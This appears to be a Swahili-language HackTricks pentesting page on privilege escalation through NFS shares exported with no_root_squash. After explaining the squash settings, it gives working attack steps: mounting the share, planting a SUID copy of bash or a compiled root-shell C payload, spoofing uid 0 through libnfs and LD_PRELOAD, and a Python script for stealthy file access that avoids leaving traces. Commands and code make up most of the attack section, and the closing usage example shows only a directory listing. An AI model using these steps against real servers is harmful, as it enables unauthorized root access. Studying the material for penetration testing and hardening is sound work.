{{#include ../../banners/hacktricks-training.md}}

# Squashing Basic Info

NFS kwa kawaida (hasa katika linux) itatumia `uid` na `gid` zilizotolewa na mteja anayejitahidi kufikia faili (ikiwa kerberos haitumiki). Hata hivyo, kuna baadhi ya mipangilio ambayo inaweza kuwekwa kwenye seva ili **kubadilisha tabia hii**:

- **`all_squash`**: Inakandamiza ufikiaji wote kwa kubadilisha kila mtumiaji na kundi kuwa **`nobody`** (65534 unsigned / -2 signed). Hivyo, kila mtu ni `nobody` na hakuna watumiaji wanaotumika.
- **`root_squash`/`no_all_squash`**: Hii ni chaguo la kawaida kwenye Linux na **inakandamiza tu ufikiaji wenye uid 0 (root)**. Hivyo, `UID` na `GID` yoyote inakubaliwa lakini `0` inakandamizwa kuwa `nobody` (hivyo hakuna uigaji wa root unaowezekana).
- **``no_root_squash`**: Mipangilio hii ikiwa imewezeshwa haikandamizi hata mtumiaji wa root. Hii inamaanisha kwamba ikiwa unakata dirisha na mipangilio hii unaweza kufikia kama root.

Katika **/etc/exports** faili, ikiwa unapata dirisha ambalo limepangiliwa kama **no_root_squash**, basi unaweza **kufikia** kutoka **kama mteja** na **kuandika ndani** ya dirisha hilo **kama** ungekuwa **root** wa mashine hiyo.

Kwa maelezo zaidi kuhusu **NFS** angalia:

{{#ref}}
/network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

# Privilege Escalation

## Remote Exploit

Chaguo la 1 kutumia bash:
- **Kukata dirisha hiyo** katika mashine ya mteja, na **kama root kunakili** ndani ya folda iliyokatwa **/bin/bash** binary na kuipa **SUID** haki, na **kutekeleza kutoka kwa mashine ya mwathirika** hiyo bash binary.
- Kumbuka kwamba ili kuwa root ndani ya NFS share, **`no_root_squash`** lazima iwe imepangiliwa kwenye seva.
- Hata hivyo, ikiwa haijawezeshwa, unaweza kupandisha hadhi kwa mtumiaji mwingine kwa kunakili binary hiyo kwenye NFS share na kuipa ruhusa ya SUID kama mtumiaji unayetaka kupandisha hadhi.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2 kutumia msimbo wa c uliokamilishwa:
- **Kuweka hiyo directory** kwenye mashine ya mteja, na **kama root kunakili** ndani ya folda iliyowekwa payload yetu iliyokamilishwa ambayo itatumia ruhusa ya SUID, itapeleka **SUID** haki, na **kuitekeleza kutoka kwa** mashine ya mwathirika hiyo binary (unaweza kupata hapa baadhi ya [C SUID payloads](payloads-to-execute.md#c)).
- Vikwazo sawa kama hapo awali
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Local Exploit

> [!NOTE]
> Kumbuka kwamba ikiwa unaweza kuunda **tunnel kutoka kwa mashine yako hadi mashine ya mwathirika unaweza bado kutumia toleo la Remote ili kutumia hii privilege escalation kwa kutunza bandari zinazohitajika**.\
> Huu ni ujanja wa kufuata ikiwa faili `/etc/exports` **inaonyesha IP**. Katika kesi hii **hutaweza kutumia** kwa hali yoyote **remote exploit** na utahitaji **kudhulumu ujanja huu**.\
> Sharti lingine muhimu ili exploit ifanye kazi ni kwamba **export ndani ya `/etc/export`** **lazima litumie bendera ya `insecure`**.\
> --_Sijui kama `/etc/export` inaonyesha anwani ya IP ujanja huu utafanikiwa_--

## Basic Information

Hali hii inahusisha kutumia NFS share iliyowekwa kwenye mashine ya ndani, ikitumia kasoro katika spesifikasiyo ya NFSv3 ambayo inaruhusu mteja kubainisha uid/gid yake, ambayo inaweza kuwezesha ufikiaji usioidhinishwa. Kutumia exploit kunahusisha kutumia [libnfs](https://github.com/sahlberg/libnfs), maktaba inayoruhusu uongo wa NFS RPC calls.

### Compiling the Library

Hatua za ukusanyaji wa maktaba zinaweza kuhitaji marekebisho kulingana na toleo la kernel. Katika kesi hii maalum, syscalls za fallocate zilikuwa zimeandikwa nje. Mchakato wa ukusanyaji unajumuisha amri zifuatazo:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Kufanya Ushambuliaji

Ushambuliaji unahusisha kuunda programu rahisi ya C (`pwn.c`) inayoinua mamlaka hadi root na kisha kutekeleza shell. Programu inakusanywa, na binary inayotokana nayo (`a.out`) inawekwa kwenye sehemu yenye suid root, ikitumia `ld_nfs.so` kudanganya uid katika wito za RPC:

1. **Kusanya msimbo wa ushambuliaji:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Weka exploit kwenye share na kubadilisha ruhusa zake kwa kudanganya uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Teua exploit ili kupata ruhusa za mzizi:**
```bash
/mnt/share/a.out
#root
```
## Bonus: NFShell for Stealthy File Access

Mara tu ufikiaji wa root unapatikana, ili kuingiliana na NFS share bila kubadilisha umiliki (ili kuepuka kuacha alama), script ya Python (nfsh.py) inatumika. Script hii inarekebisha uid ili kuendana na ile ya faili inayofikiwa, ikiruhusu kuingiliana na faili kwenye share bila matatizo ya ruhusa:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Kimbia kama:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
